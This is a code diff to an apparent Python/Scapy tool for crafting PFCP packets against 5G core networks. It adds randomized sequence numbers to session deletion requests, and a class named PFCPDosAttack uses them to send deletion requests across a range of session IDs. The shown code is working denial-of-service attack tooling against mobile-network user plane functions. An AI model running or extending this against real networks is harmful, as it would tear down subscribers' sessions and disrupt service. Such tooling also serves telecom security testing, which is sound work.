@@ -319,7 +319,7 @@ class Ez_PFCP:
         return pkt
 
 
-    def Build_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+    def Build_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None, random_seq=False):
 
         seid = seid or self.seid
         src_addr = src_addr or self.src_addr
@@ -338,12 +338,8 @@ class Ez_PFCP:
         }, "[Build_PFCP_session_deletion_req]"):
             return 
         
-        if(not self.check_parameters(src_addr, dest_addr, src_port, dest_port, seid)):
-            return
-            
-        
 
-        
+                
         node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
 
         pfcp_msg = PFCP(
@@ -351,7 +347,7 @@ class Ez_PFCP:
             message_type=54,
             seid=seid,
             S=1,
-            seq=1
+            seq=self.new_seq(randomize=random_seq)
         ) / node_id
         packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
         packet = packet.__class__(bytes(packet))
@@ -473,12 +469,15 @@ class Ez_PFCP:
             self.logger.success(f"PFCP Session Establishment packet sent to {dest_addr} with SEID {seid}")
             
 
-    def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False):
+    def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False, random_seq=False):
+        
         
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
+        
+        
         
         if not self.paramsHandler.check_parameters({
             "src_addr": src_addr,
@@ -497,7 +496,8 @@ class Ez_PFCP:
                 src_addr=src_addr,
                 dest_addr=dest_addr,
                 src_port=src_port,
-                dest_port=dest_port
+                dest_port=dest_port,
+                random_seq=random_seq
             )
         if turbo:
             send(req)
@@ -735,7 +735,7 @@ class PFCPDosAttack:
         for i in range(start_index, start_index+count): 
             try:
 
-                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i+1)
+                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i+1, random_seq=True)
 
                     
                 if response == self.REQUEST_ACCEPTED:
